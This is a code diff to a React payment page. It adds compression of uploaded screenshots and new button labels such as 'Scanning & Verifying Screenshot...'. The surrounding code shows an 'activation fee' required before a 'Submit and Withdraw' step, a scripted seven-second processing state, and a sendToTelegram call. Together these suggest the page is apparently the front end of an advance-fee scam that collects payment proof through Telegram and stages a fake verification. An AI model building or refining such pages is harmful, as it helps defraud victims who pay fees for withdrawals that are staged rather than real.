@@ -4,6 +4,7 @@ import Logo from '../components/Logo';
 import PageLoader from '../components/PageLoader';
 import Confetti from '../components/Confetti';
 import { getApplication, getSession, setApplication, calculateActivationFee } from '../lib/session';
+import { compressScreenshot } from '../lib/imageCompressor';
 import { sendToTelegram } from '../lib/api';
 import {
   ArrowLeft,
@@ -137,6 +138,7 @@ export default function PaymentPage() {
   const [copied, setCopied] = useState(false);
   const [validationError, setValidationError] = useState('');
   const [isVerifyingScreenshot, setIsVerifyingScreenshot] = useState(false);
+  const [isCompressing, setIsCompressing] = useState(false);
 
   // 7-second loading state: 'idle' | 'processing' | 'completed'
   const [withdrawalState, setWithdrawalState] = useState<'idle' | 'processing' | 'completed'>('idle');
@@ -149,17 +151,26 @@ export default function PaymentPage() {
     setTimeout(() => setCopied(false), 2500);
   };
 
-  // Handle file change
-  const handleFileChange = (e: ChangeEvent<HTMLInputElement>) => {
+  // Handle file change with automatic fast optimization
+  const handleFileChange = async (e: ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
     if (file) {
       setScreenshotName(file.name);
       setValidationError('');
-      const reader = new FileReader();
-      reader.onloadend = () => {
-        setScreenshotPreview(reader.result as string);
-      };
-      reader.readAsDataURL(file);
+      setIsCompressing(true);
+      try {
+        const optimizedDataUrl = await compressScreenshot(file);
+        setScreenshotPreview(optimizedDataUrl);
+      } catch (err) {
+        console.warn('Fallback to standard reader:', err);
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          setScreenshotPreview(reader.result as string);
+        };
+        reader.readAsDataURL(file);
+      } finally {
+        setIsCompressing(false);
+      }
     }
   };
 
@@ -1071,13 +1082,18 @@ export default function PaymentPage() {
             <button
               id="submit-withdraw-btn"
               onClick={handleSubmitAndWithdraw}
-              disabled={isVerifyingScreenshot}
+              disabled={isVerifyingScreenshot || isCompressing}
               className="w-full py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] transition shadow-md flex items-center justify-center gap-2 cursor-pointer border border-[#006591]/40 disabled:opacity-50"
             >
               {isVerifyingScreenshot ? (
                 <>
                   <Loader2 className="w-5 h-5 animate-spin text-white" />
-                  <span>Verifying activation fee...</span>
+                  <span>Scanning & Verifying Screenshot...</span>
+                </>
+              ) : isCompressing ? (
+                <>
+                  <Loader2 className="w-5 h-5 animate-spin text-white" />
+                  <span>Optimizing photo...</span>
                 </>
               ) : (
                 <span>Submit and Withdraw</span>
